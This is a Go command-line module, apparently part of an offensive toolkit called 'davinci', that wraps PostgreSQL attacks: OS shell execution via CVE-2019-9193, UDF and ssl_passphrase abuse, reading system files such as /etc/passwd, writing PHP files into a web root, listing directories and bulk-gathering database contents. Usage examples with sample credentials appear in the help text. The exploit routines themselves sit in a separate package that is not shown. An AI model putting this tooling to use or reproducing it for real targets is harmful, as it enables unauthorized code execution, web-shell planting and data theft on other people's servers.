package cmd

import (
	"davinci/common/log"
	"davinci/core"
	"encoding/hex"
	"fmt"
	"github.com/spf13/cobra"
	"io/ioutil"
)

var (
	pgsqlHost                  string
	pgsqlPort                  int
	pgsqlUser                  string
	pgsqlPasswd                string
	pgsqlDbName                string
	pgsqlSql                   string
	pgsqlTargetFile            string
	pgsqlSourceFile            string
	pgsqlContent               string
	pgsqlHex                   bool
	pgsqlPgRead_readfile       bool
	pgsqlLoImport_readfile     bool
	pgsqlCopyFrom_readfile     bool
	pgsqlLoExport_writefile    bool
	pgsqlCopyTo_writefile      bool
	pgsqlCve_2019_9193_osshell bool
	pgsqlUdf_osshell           bool
	pgsqlSslPassPharse_osshell bool
	pgsqlNoInteractive_osshell bool

	pgsqlCmd = &cobra.Command{
		Use:   "pgsql [exec|shell|auto_gather|osshell|writefile|readfile|mkdir|lsdir]",
		Short: "pgsql client",
		Long: "pgsql client:\n" +
			"  - exec:        execute the command once and return directly\n" +
			"  - shell:       pgsql interactive shell\n" +
			"  - auto_gather: automatically collect database information, including users, databases,\n" +
			"                 tables, table structures, and the first 5 rows of data for each table" +
			"  - osshell:     exec os shell,three ways: [cve-2019-9193 | udf | ssl_passpharse]\n" +
			"  - writefile:   write file,two ways: [lo_export | copy_to]\n" +
			"  - readfile:    read file,three ways: [lo_import | pg_read | copy_from]\n" +
			"  - mkdir:       create dir through log_directory,premise is logging_collector = on\n" +
			"  - lsdir:       list dir through pg_ls_dir\n" +
			"\n" +
			"Example: \n" +
			"  davinci pgsql exec        -H 192.168.1.2 -P 5432 -u postgres -p 123456 -c \"select user;\" \n" +
			"  davinci pgsql shell       -H 192.168.1.2 -P 5432 -u postgres -p 123456 \n" +
			"  davinci pgsql auto_gather -H 192.168.1.2 -P 5432 -u postgres -p 123456 \n" +
			"  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193\n" +
			"  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --cve-2019-9193 --no-interactive -c \"whoami\"\n" +
			"  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf\n" +
			"  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --udf --no-interactive -c \"whoami\"\n" +
			"  davinci pgsql osshell     -H 192.168.1.2 -P 5432 -u postgres -p 123456 --ssl_passpharse -c \"whoami\" \n" +
			"  davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_export -s ./eval.php -t /var/www/html/1.php \n" +
			"  davinci pgsql writefile   -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_to -C \"<?php phpinfo(); ?>\" -t /var/www/html/1.php \n" +
			"  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --lo_import -t /etc/passwd \n" +
			"  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --pg_read -t /etc/passwd \n" +
			"  davinci pgsql readfile    -H 192.168.1.2 -P 5432 -u postgres -p 123456 --copy_from -t /etc/passwd --hex\n" +
			"  davinci pgsql mkdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t /etc/pg_dir \n" +
			"  davinci pgsql lsdir       -H 192.168.1.2 -P 5432 -u postgres -p 123456 -t / \n",

		Args:      cobra.ExactValidArgs(1),
		ValidArgs: []string{"exec", "shell", "auto_gather", "osshell", "writefile", "readfile", "mkdir", "lsdir"},
		RunE: func(command *cobra.Command, args []string) error {
			service := &core.Pgsql{
				Host:   pgsqlHost,
				Port:   pgsqlPort,
				User:   pgsqlUser,
				Passwd: pgsqlPasswd,
				DbName: pgsqlDbName,
				Cmd:    pgsqlSql,
			}
			defer service.Close()
			switch args[0] {
			case "exec":
				if pgsqlSql == "" {
					return fmt.Errorf("davinci pgsql exec must have cmd")
				}
				service.ExecuteOnce()
			case "shell":
				service.Shell()
			case "auto_gather":
				service.AutoGather()
			case "osshell":
				if !pgsqlCve_2019_9193_osshell && !pgsqlUdf_osshell && !pgsqlSslPassPharse_osshell {
					return fmt.Errorf("please choose mode [cve-2019-9193|udf|ssl_passpharse]")
				}
				if pgsqlSql == "" && pgsqlNoInteractive_osshell {
					return fmt.Errorf("davinci pgsql osshell no interactive need cmd,please use -c to specify")
				}
				if pgsqlCve_2019_9193_osshell {
					service.ExecOsShell(service.Cmd, !pgsqlNoInteractive_osshell, service.OsExec_cve_2019_9193)
				} else if pgsqlUdf_osshell {
					service.ExecOsShell(service.Cmd, !pgsqlNoInteractive_osshell, service.OsExec_UDF)
				} else {
					if pgsqlSql == "" {
						return fmt.Errorf("davinci pgsql osshell by ssl_passpharse need cmd,please use -c to specify,\n" +
							"ssl_passpharse mode is not support interactive and display")
					}
					if service.OsExec_ssl_passpharse_command(service.Cmd) {
						log.Info("exec success")
					} else {
						log.Warn("exec fail")
					}
				}
			case "writefile":
				if pgsqlSourceFile == "" && pgsqlContent == "" {
					return fmt.Errorf("davinci pgsql writefile must have source or content")
				}
				if pgsqlTargetFile == "" {
					return fmt.Errorf("davinci pgsql writefile must have target")
				}
				if !pgsqlCopyTo_writefile && !pgsqlLoExport_writefile {
					return fmt.Errorf("please choose mode [lo_export|copy_to]")
				}
				var h string
				if pgsqlContent != "" {
					if pgsqlHex {
						h = pgsqlContent
					} else {
						h = hex.EncodeToString([]byte(pgsqlContent))
					}
				} else {
					if content, readErr := ioutil.ReadFile(pgsqlSourceFile); readErr != nil {
						return readErr
					} else {
						h = hex.EncodeToString(content)
					}
				}
				if pgsqlLoExport_writefile {
					service.WriteFile_by_LoExport(h, pgsqlTargetFile)
				} else {
					service.WriteFile_by_CopyTo(h, pgsqlTargetFile)
				}
			case "readfile":
				if pgsqlTargetFile == "" {
					return fmt.Errorf("davinci pgsql readfile must have target")
				}
				if !pgsqlLoImport_readfile && !pgsqlPgRead_readfile && !pgsqlCopyFrom_readfile {
					return fmt.Errorf("please choose mode [lo_import|pg_read|copy_from]")
				}
				var result string
				var readErr error
				if pgsqlLoImport_readfile {
					result, readErr = service.ReadFile_by_LoImport(pgsqlTargetFile, pgsqlHex)
				} else if pgsqlPgRead_readfile {
					result, readErr = service.ReadFile_by_PgReadFile(pgsqlTargetFile)
					if pgsqlHex {
						result = hex.EncodeToString([]byte(result))
					}
				} else {
					result, readErr = service.ReadFile_by_CopyFrom(pgsqlTargetFile, pgsqlHex)
				}
				if readErr != nil {
					return readErr
				}
				log.Output(result)
			case "mkdir":
				if pgsqlTargetFile == "" {
					return fmt.Errorf("davinci pgsql mkdir must have target")
				}
				service.Mkdir_by_LogDirectory(pgsqlTargetFile)
			case "lsdir":
				if pgsqlTargetFile == "" {
					return fmt.Errorf("davinci pgsql lsdir must have target")
				}
				if result, err := service.ListDir_by_PgLsDir(pgsqlTargetFile); err != nil {
					log.Error(err)
				} else {
					log.Output(result)
				}

			}
			return nil
		},
	}
)

func init() {

	pgsqlCmd.Flags().StringVarP(&pgsqlHost, "host", "H", "127.0.0.1", "pgsql ip addr")
	pgsqlCmd.Flags().IntVarP(&pgsqlPort, "port", "P", 5432, "pgsql port")
	pgsqlCmd.Flags().StringVarP(&pgsqlUser, "user", "u", "postgres", "username")
	pgsqlCmd.Flags().StringVarP(&pgsqlPasswd, "passwd", "p", "", "pasword")
	pgsqlCmd.Flags().StringVarP(&pgsqlDbName, "dbName", "d", "", "database name,not require")
	pgsqlCmd.Flags().StringVarP(&pgsqlSql, "cmd", "c", "", "cmd to be executed, used in exec(sql) and osshell(shell) mode")
	pgsqlCmd.Flags().StringVarP(&pgsqlTargetFile, "target", "t", "", "[write/read] (remote) target file path,use for write/read file mode")
	pgsqlCmd.Flags().StringVarP(&pgsqlSourceFile, "source", "s", "", "[write] (local)  source file path,use for write file mode")
	pgsqlCmd.Flags().StringVarP(&pgsqlContent, "content", "C", "", "[write] write content to target,use for write file mode,choose one of content and source")
	pgsqlCmd.Flags().BoolVarP(&pgsqlHex, "hex", "", false, "[write/read] encode write/read file content")
	pgsqlCmd.Flags().BoolVarP(&pgsqlLoImport_readfile, "lo_import", "", false, "[read] use lo_import to readfile")
	pgsqlCmd.Flags().BoolVarP(&pgsqlPgRead_readfile, "pg_read", "", false, "[read] use pg_read to readfile")
	pgsqlCmd.Flags().BoolVarP(&pgsqlCopyFrom_readfile, "copy_from", "", false, "[read] use copy from to readfile")
	pgsqlCmd.Flags().BoolVarP(&pgsqlLoExport_writefile, "lo_export", "", false, "[write] use lo_export to readfile")
	pgsqlCmd.Flags().BoolVarP(&pgsqlCopyTo_writefile, "copy_to", "", false, "[write] use 'copy to' to readfile")
	pgsqlCmd.Flags().BoolVarP(&pgsqlCve_2019_9193_osshell, "cve-2019-9193", "", false, "[osshell] use cve-2019-9193(copy from program) to exec,support version>=9.3")
	pgsqlCmd.Flags().BoolVarP(&pgsqlUdf_osshell, "udf", "", false, "[osshell] use udf to exec")
	pgsqlCmd.Flags().BoolVarP(&pgsqlSslPassPharse_osshell, "ssl_passpharse", "", false, "[osshell] use pgconfig ssl passpharse to exec,support version>=11")
	pgsqlCmd.Flags().BoolVarP(&pgsqlNoInteractive_osshell, "no-interactive", "", false, "no-interactive with os shell")

	pgsqlCmd.MarkFlagRequired("passwd")
	rootCmd.AddCommand(pgsqlCmd)
}
